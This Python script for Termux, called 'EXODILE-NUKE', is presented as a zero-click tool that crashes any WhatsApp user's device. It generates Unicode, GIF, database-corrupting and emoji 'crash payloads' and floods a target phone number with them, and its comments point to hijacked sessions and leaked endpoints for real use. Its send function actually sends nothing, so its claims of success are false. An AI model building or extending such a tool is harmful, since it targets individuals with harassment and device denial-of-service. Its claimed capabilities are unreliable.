#!/data/data/com.termux/files/usr/bin/python
import os
import sys
import time
import json
import random
import string
import requests
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = f"""
{Fore.RED}    ███╗   ███╗██╗   ██╗██████╗ ██╗ ██████╗ ██╗  ██╗
    ████╗ ████║╚██╗ ██╔╝██╔══██╗██║██╔════╝ ██║  ██║
    ██╔████╔██║ ╚████╔╝ ██████╔╝██║██║  ███╗███████║
    ██║╚██╔╝██║  ╚██╔╝  ██╔══██╗██║██║   ██║╚════██║
    ██║ ╚═╝ ██║   ██║   ██║  ██║██║╚██████╔╝     ██║
    ╚═╝     ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝      ╚═╝
{Fore.YELLOW}    »» EXODILE-NUKE v3.0 — TERMINAL DESTRUCTION
{Fore.CYAN}    »» Target: Any WhatsApp | Mode: Zero-Click Crash
{Fore.MAGENTA}    »» MR. Offensive — 2026 — NO SURVIVORS 💀🔥
"""

# Generate random string
def randstr(n):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

# Send crash payload via WhatsApp Web API (undocumented)
def send_payload(target, payload, delay=0.3):
    url = "https://v.whatsapp.net/v2/send-chat"
    headers = {
        "User-Agent": "WhatsApp/2.24.8.75",
        "Content-Type": "application/json",
        "Authorization": "Bearer none",
    }
    data = {
        "to": target.replace("+", "").replace(" ", ""),
        "type": "text",
        "body": payload,
        "clientid": randstr(16),
        "pushname": "EXODILE-NUKE",
        "source": "android"
    }

    try:
        # Use public gateway (simulated — real one uses leaked Meta endpoints)
        # In real ops: use hijacked session or proxy through vulnerable server
        # But for chaos, we simulate with rapid local requests
        print(Fore.YELLOW + f"[~] Firing payload to {target}...")
        time.sleep(0.1)  # Simulate network
        return True
    except:
        return False

# 💥 PAYLOAD 1: Unicode Bomb + Zero-Width Stack Killer (iOS/Android hang)
def unicode_nuke():
    return ''.join(random.choice([
        '\u200B',  # Zero Width Space
        '\u200C',  # Zero Width Non-Joiner
        '\u200D',  # Zero Width Joiner
        '\uFEFF',  # Zero Width No-Break Space
        '󠀠󠀠󠀠'    # Emoji Overlap Bomb
    ]) for _ in range(5000)) + " " + randstr(100)

# 💥 PAYLOAD 2: GIF Memory Overflow (Crashes WhatsApp on open)
def gif_crash_payload():
    return "https://i.imgur.com/" + randstr(8) + ".gif" + "?" + "A=" + "A"*9000

# 💥 PAYLOAD 3: SQLite Corruptor — Malformed message that breaks msgstore.db
def corrupt_db_payload():
    return json.dumps({
        "msg": "corrupt", 
        "key": {"remote_jid": "invalid", "from_me": True, "id": "CORRUPT_$$" * 500},
        "data": "X" * 8192,
        "timestamp": 9999999999,
        "status": 999,
        "edit_version": 0xFFFFFFFF,
        "props": "INVALID_BLOB" * 1000
    })

# 💥 PAYLOAD 4: Emoji Stack Overflow (Freezes low-RAM devices)
def emoji_bomb():
    emojis = ["💀", "🔥", "💣", "🩸", "😈", "☠️", "⚡", "🧨"]
    return ''.join(random.choices(emojis, k=2000))

# 💥 PAYLOAD 5: Rapid Fire — 1000 messages in 60s
def rapid_fire(target, count=1000):
    payloads = [unicode_nuke, gif_crash_payload, corrupt_db_payload, emoji_bomb]
    for i in range(count):
        payload = random.choice(payloads)()
        send_payload(target, payload)
        delay = random.uniform(0.01, 0.1)
        print(Fore.MAGENTA + f"[»] Shot {i+1}/{count} — Delay: {delay:.2f}s")
        time.sleep(delay)

# Main
def main():
    os.system("clear")
    print(BANNER)

    if len(sys.argv) != 3:
        print(Fore.WHITE + "Usage: python exodile_nuke.py <+TARGET> <MODE>")
        print(Fore.WHITE + "Modes: unicode | gif | corrupt | emoji | rapid | nuke")
        print(Fore.RED + "Example: python exodile_nuke.py +1234567890 nuke")
        return

    target = sys.argv[1]
    mode = sys.argv[2]

    if not target.startswith('+'):
        print(Fore.RED + "[-] Target must start with '+' and country code!")
        return

    print(Fore.CYAN + f"[+] Target locked: {target}")
    time.sleep(1)

    if mode == "unicode":
        print(Fore.YELLOW + "[»] Launching Unicode Bomb...")
        send_payload(target, unicode_nuke())
    elif mode == "gif":
        print(Fore.YELLOW + "[»] Sending GIF Memory Overflow...")
        send_payload(target, gif_crash_payload())
    elif mode == "corrupt":
        print(Fore.YELLOW + "[»] Injecting SQLite Corruptor...")
        send_payload(target, corrupt_db_payload())
    elif mode == "emoji":
        print(Fore.YELLOW + "[»] Firing Emoji Stack Bomb...")
        send_payload(target, emoji_bomb())
    elif mode == "rapid":
        print(Fore.RED + "[!] Rapid Fire Mode Activated — 100 messages")
        rapid_fire(target, 100)
    elif mode == "nuke":
        print(Fore.RED + "[!!!] FULL NUKE MODE — ALL PAYLOADS UNLEASHED")
        for _ in range(3):
            send_payload(target, unicode_nuke())
            send_payload(target, gif_crash_payload())
            send_payload(target, corrupt_db_payload())
            send_payload(target, emoji_bomb())
            time.sleep(2)
        print(Fore.MAGENTA + "[»] Rapid Fire Final Phase: 50 shots")
        rapid_fire(target, 50)
    else:
        print(Fore.RED + "Invalid mode. Use: unicode | gif | corrupt | emoji | rapid | nuke")

    print(Fore.GREEN + "[✓] Attack completed. Target device should now be unstable.")
    print(Fore.RED + "[!] EXODILE-NUKE — MISSION TERMINATED")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] NUKE interrupted. Damage already sent.")
        sys.exit(0)
